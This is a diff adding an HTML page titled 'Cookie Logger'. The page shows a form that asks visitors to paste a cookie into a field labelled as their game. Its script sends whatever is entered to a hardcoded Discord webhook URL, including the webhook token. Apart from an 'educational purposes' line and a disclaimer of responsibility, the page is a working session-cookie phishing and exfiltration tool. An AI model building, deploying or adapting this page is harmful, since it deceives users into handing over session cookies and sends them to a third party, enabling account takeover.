@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cookie Logger
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      padding: 40px;
+    }
+
+    .form-container {
+      background: white;
+      width: 600px;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      margin-bottom: 5px;
+    }
+
+    .subtitle {
+      color: gray;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .warning {
+      background: #fff3cd;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 13px;
+      margin-bottom: 15px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 5px;
+      margin-top: 8px;
+      font-size: 14px;
+    }
+
+    input[type="text"]:focus {
+      border-color: #d93025;
+      outline: none;
+    }
+
+    .submit-btn {
+      margin-top: 25px;
+      padding: 10px 20px;
+      background: #202124;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: #333;
+    }
+  </style>
+</head>
+<body>
+
+<div class="form-container">
+  <h1> - </h1>
+  <div class="subtitle">This script was made for educational purposes.!</div>
+
+  <div class="warning">
+    :warning: i will nope be taking any action if somethign happens !
+  </div>
+
+  <label>Ur Game !! *</label>
+  <input type="text" id="gameInput" placeholder="Paste the cookie here">
+
+  <button class="submit-btn" onclick="submitForm()">Submit</button>
+</div>
+
+<script>
+async function submitForm() {
+  const game = document.getElementById("gameInput").value;
+
+  if (!game) {
+    alert("Please Enter the cookie here");
+    return;
+  }
+
+  const webhookURL = "https://discord.com/api/webhooks/1475146952269238363/6bejDU9CqsGSpFj8zvmpuaGtKCIz6Fogs111wtgzCAMCVpEYO3bA_TaifbAyOV9Lxtv3";
+
+  await fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: ":video_game: New Submission!\nFavorite Game: " + game
+    })
+  });
+
+  alert("Submitted successfully!");
+  document.getElementById("gameInput").value = "";
+}
+</script>
+
+</body>
+</html>
